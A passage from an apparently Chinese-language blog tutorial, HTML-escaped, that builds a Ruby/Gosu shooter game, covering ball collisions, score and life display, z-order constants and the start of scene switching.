&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;GameWindow&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Gosu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Window&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;# 初始化&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;initialize&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 球的数组&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@balls&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
  
  &lt;span class=&quot;c1&quot;&gt;# 更新&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;update&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 新增加一个球&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
      &lt;span class=&quot;vi&quot;&gt;@balls&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Ball&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;# 球的移动&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@balls&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ball&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;ball&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;move&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;ball&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hit_bullets?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vi&quot;&gt;@bullets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;ball&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hit_plane?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vi&quot;&gt;@player&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;delete_useless_balls&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;# 绘制界面&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;draw&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@balls&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ball&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ball&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;draw&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
  
  &lt;span class=&quot;c1&quot;&gt;# 删除死掉的Ball&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;delete_useless_balls&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@balls&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;length&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;unless&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@balls&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;within?&lt;/span&gt;  
        &lt;span class=&quot;vi&quot;&gt;@balls&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;delete_at&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# puts &quot;delete&quot;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;上面的代码也是很好理解的吧? &lt;del&gt;所以我就不解释了.&lt;/del&gt; 
简单地解释一下:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;首先是两个命中判定的函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hit_bullets?&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hit_plane?&lt;/code&gt;, 
这两个的逻辑是类似的, 都是利用的是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hit?&lt;/code&gt;方法来判断有没有相撞. 
那么相撞的判断是什么呢? 很简单, 就是我们熟悉的勾股定理.&lt;/li&gt;
  &lt;li&gt;接下来是我们的删除代码: 因为被打爆的球要从屏幕上消失, 
所以我们可以利用和删除无用子弹一样的代码来处理, 重复利用了
(甚至我觉得可以直接写成一个代码, 但是暂时我们不必做得那么绝. )&lt;/li&gt;
  &lt;li&gt;为了达到类似的效果, 我们还需要做到对&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Plane&lt;/code&gt;类和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Bullet&lt;/code&gt;类进行一些修改, 
也就是要达到让他们能够被击中的效果&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;简单的交互&quot;&gt;简单的交互&lt;/h3&gt;
&lt;p&gt;最后我们运行程序就可以达到了射击和击中的效果了, 但是是不是还差一点? 
我们的交互有点差: 我们要知道自己还剩下多少血量, 要知道自己的分数, 
等等… 这样才好玩嘛. 所以这个时候我们就要知道如何让gosu显示文字.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.rubydoc.info/gems/gosu/Gosu/Font&quot;&gt;文档在此&lt;/a&gt;, 
那么我们需要的是一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;draw_text&lt;/code&gt;的函数:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#initialize(height, options = {})&lt;/code&gt; =&amp;gt; Font&lt;/p&gt;

  &lt;p&gt;Load a font from the system fonts or a file.&lt;/p&gt;

  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#draw_text(text, x, y, z, scale_x = 1, scale_y = 1, color = 0xff_ffffff, mode = :default)&lt;/code&gt; =&amp;gt; void&lt;/p&gt;

  &lt;p&gt;This method returns an undefined value.&lt;/p&gt;

  &lt;p&gt;Draws a single line of text with its top left corner at (x, y).&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;于是我们可以修改代码让我们的窗口的左上角能够显示一个我们剩余的生命值:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;GameWindow&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Gosu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Window&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;# 初始化&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;initialize&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 文字&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Gosu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Font&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;draw&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;draw_text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Life: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;vi&quot;&gt;@player&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;life&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这里提供一个简单的解释: 我们的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@text&lt;/code&gt;是一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Gosu::Font&lt;/code&gt;类, 也就是载入一个字体, 
然后设置了字体的高度, 也就是常见的字号大小, 这里的单位是px也就是像素, 
用这个字体, 我们可以在(10, 10)坐标的地方画出我们的文字&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;Life: #{@player.life}&quot;&lt;/code&gt;, 
这个文字利用了ruby的一个字符串的特性: 就是会将双引号中&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#{}&lt;/code&gt;里面的内容&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.to_s&lt;/code&gt;后插入到字符串中.&lt;/p&gt;

&lt;p&gt;类似的, 我们还可以加入分数:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;GameWindow&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Gosu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Window&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;# 初始化&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;initialize&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 分数  &lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@score&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;  
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;# 更新&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;update&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 球的移动                                        &lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@balls&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ball&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;                             
      &lt;span class=&quot;n&quot;&gt;ball&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;move&lt;/span&gt;                                       
      &lt;span class=&quot;vi&quot;&gt;@score&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ball&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hit_bullets?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vi&quot;&gt;@bullets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
      &lt;span class=&quot;n&quot;&gt;ball&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hit_plane?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vi&quot;&gt;@player&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                                    
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;                                                           
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;draw&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;draw_text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Score: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;vi&quot;&gt;@score&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Life: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;vi&quot;&gt;@player&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;life&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这里我们用了我们之前写的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ball.hit_bullets?&lt;/code&gt;方法的返回值, 
这样的话我们的程序就看起来像是那么回事了:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/_img/i-am-boring/not-bad.png&quot; alt=&quot;煞有其事&quot; title=&quot;不错哦&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;这个数字是什么意思---简单的优化&quot;&gt;这个数字是什么意思? - 简单的优化&lt;/h3&gt;
&lt;p&gt;虽然我的程序运行起来人模狗样的, 但是我的代码并不是那么友好:&lt;/p&gt;

&lt;p&gt;里面有太多的不知道有什么意义的数字: 比如是设置&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;draw&lt;/code&gt;的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;z&lt;/code&gt;值的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2&lt;/code&gt;等, 
很容易让人看晕了, 并且假如我们想要进一步修改的话, 就会遇到让人混乱的修改问题 – 
我们可能改了这又要修改那, 这也太麻烦了.&lt;/p&gt;

&lt;p&gt;(这样的代码很容易让人今天写完代码, 明天就忘记了自己写的是啥, 看代码就会看不懂. )&lt;/p&gt;

&lt;p&gt;所以这一部分, 我们不必关注如何增加我们程序的功能, 而是简单地关注一下如何让代码变得好看, 
毕竟这是一个看脸的时代.&lt;/p&gt;

&lt;p&gt;首先, 我们需要把代码里面的那些无意义的数字给换掉, 
这个时候我们可以利用ruby中的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;module&lt;/code&gt;来将这些常数给命名:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;module&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;ZOrder&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;BACKGROUND&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;PLANE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;BULLET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;BALL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;UI&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_a&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后我们在相应的地方就可以调用这样的代码, 就可以保证调用的时候很友好了, 
比如说这里以飞机为例:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Plane&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;# 画出飞机            &lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;draw&lt;/span&gt;                                   
    &lt;span class=&quot;vi&quot;&gt;@image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;draw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vi&quot;&gt;@x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@hf_width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@hf_height&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ZOrder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;PLANE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这样就很容易区分了.&lt;/p&gt;

&lt;p&gt;(并且除此之外, 使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;module&lt;/code&gt;还可以让我们把方法method打包在一个命名空间里面, 
将相同的方法进行分发和包装, 达到将代码整洁的作用, 但是目前我没怎么用过, 
所以以后再试试. )&lt;/p&gt;

&lt;h2 id=&quot;加入不同的场景&quot;&gt;加入不同的场景&lt;/h2&gt;
&lt;p&gt;虽然我们的游戏可以玩了, 但是我们现在的游戏不仅没有结束, 
(你甚至可以看到生命值为负的情况, 这样不就是无敌作弊版嘛? )
还没有开始, 那么玩家们该如何知道要如何使用这个游戏呢? 
所以我们需要加入一些不同的场景.&lt;/p&gt;

&lt;p&gt;(因为我好像没有看到过类似的东西, 所以我们需要自己从头开始写类似的场景切换代码, 
可能是有类似的, 但是我也不是一个高手, 只是一个凭兴趣学学的门外汉而已. 
所以我们就用土味&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;case&lt;/code&gt;语句来做到场景切换吧. )&lt;/p&gt;

&lt;h3 id=&quot;将我们手头的场景打包成playing场景&quot;&gt;将我们手头的场景打包成&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;playing&lt;/code&gt;场景&lt;/h3&gt;
&lt;p&gt;首先我们为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GameWindow&lt;/code&gt;加入一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@scene&lt;/code&gt;变量, 里面储存着我们目前的场景, 
然后把原来的所有的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;update&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;draw&lt;/code&gt;代码重新命名为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;playing_update&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;playing_draw&lt;/code&gt;, 
在新的场景里面进行调用.&lt;/p&gt;

&lt;p&gt;(在写到这段的时候, 我突然想到了一个很重要的事情: 这个游戏没有音效!!! 
嘛, 也难怪, 毕竟我是个除了看番听歌, 电脑手机常年静音的鸟人. 忘记很正常. 
在听到了隔壁玩某农药的尴尬音效后, 我决定将音效再往后推一推, 
在我们结束这个场景的部分. )&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;GameWindow&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Gosu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Window&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;# 初始化&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;initialize&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 场景&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@scene&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:playing&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;# update&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;update&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@scene&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;when&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:playing&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;playing_update&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;when&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:ending&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;ending_update&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;when&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:starting&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;starting_update&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;# draw                                                              &lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;draw&lt;/span&gt;                                                            
    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@scene&lt;/span&gt;                                                       
    &lt;span class=&quot;k&quot;&gt;when&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:playing&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;playing_draw&lt;/span&gt;
